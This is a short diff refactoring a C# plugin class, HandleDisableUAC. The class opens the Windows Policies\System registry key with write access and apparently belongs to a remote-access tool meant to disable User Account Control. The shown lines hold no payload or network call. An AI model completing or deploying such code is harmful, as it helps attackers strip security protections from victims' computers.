@@ -1,17 +1,16 @@
-﻿using Microsoft.Win32;
-using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.Linq;
+﻿using System.Diagnostics;
 using System.Security.Principal;
-using System.Text;
+using Microsoft.Win32;
 
 namespace Plugin.Handler
 {
-    class HandleDisableUAC
+    internal class HandleDisableUAC
     {
-        RegistryKey RegKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
-        int value;
+        private readonly RegistryKey RegKey =
+            Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
+
+        private int value;
+
         public void Run()
         {
             Debug.WriteLine("Plugin Invoked");
